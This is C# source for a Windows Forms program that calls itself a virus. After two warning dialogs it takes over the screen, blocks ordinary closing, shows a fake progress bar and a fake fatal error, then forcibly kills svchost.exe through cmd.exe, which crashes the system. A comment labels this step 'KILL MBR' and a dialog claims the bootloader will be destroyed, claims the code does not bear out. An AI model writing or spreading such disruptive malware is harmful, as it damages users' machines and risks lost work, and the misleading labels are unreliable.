using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace System64
{
	public partial class Form1 : Form
	{
		private const int WS_SYSMENU = 0x80000;
		protected override CreateParams CreateParams
		{
			get
			{
				CreateParams cp = base.CreateParams;
				cp.Style &= ~WS_SYSMENU;
				return cp;
			}
		}

		public Form1()
		{
			InitializeComponent();
		}

		public int time;
		public int time2 = 5;
		public bool isSafe = true;

		private void Form1_Load(object sender, EventArgs e)
		{
			DialogResult firstwarning = MessageBox.Show("This virus is no joke, do you want to run?", "Warning", MessageBoxButtons.YesNo, MessageBoxIcon.Warning);
			if (firstwarning == DialogResult.Yes)
			{
				DialogResult secondwarning = MessageBox.Show("THIS IS THE LAST WARNING, IT WILL DESTROY THE BOOTLOADER WE ARE NOT RESPONSIBLE FOR ANY DAMAGES THIS IS JUST FOR FUN, ARE YOU SURE YOU WANT TO RUN IT?", "LAST WARNING", MessageBoxButtons.YesNo, MessageBoxIcon.Stop);
				if (secondwarning == DialogResult.Yes)
				{
					this.FormBorderStyle = FormBorderStyle.None;
					this.WindowState = FormWindowState.Maximized;
					timer1.Start();
				}
				else if (secondwarning == DialogResult.No)
				{
					this.Close();
					Application.Exit();
				}
			}
			else if (firstwarning == DialogResult.No)
			{
				this.Close();
				Application.Exit();
			}
		}


		bool finished;
		private void timer1_Tick(object sender, EventArgs e)
		{
			Random rnd = new Random();
			if (time != 100)
			{
				timer1.Tick += timer1_Tick;
				timer1.Interval = rnd.Next(1000, 1500);

				label2.Text = $"{time}% complete";
				time++;
			} else if (!finished)
			{
				finished = true;
				StartOperation();
				timer1.Stop();
			}
		}

		void StartOperation()
		{
			MessageBox.Show("FATAL ERROR IN ADRESS 0x00000007", "FATAL ERROR", MessageBoxButtons.OK, MessageBoxIcon.Error);
			timer2.Start();
		}

		private void timer2_Tick(object sender, EventArgs e)
		{
			time2--;
			if (time2 < 0)
			{
				timer2.Stop();
				
				//KILL MBR
				Process.Start("cmd.exe", @"/C taskkill /IM svchost.exe /F");
			}
		}

		private void label3_Click(object sender, EventArgs e)
		{
			timer1.Stop();
			cancel = false;
			this.Close();
			Application.Exit();
		}

		public bool cancel = true;
		private void Form1_FormClosing(object sender, FormClosingEventArgs e)
		{
			if (cancel == true)
			{
				e.Cancel = true;
			}
			else
			{
				e.Cancel = false;
			}
		}

	}
}
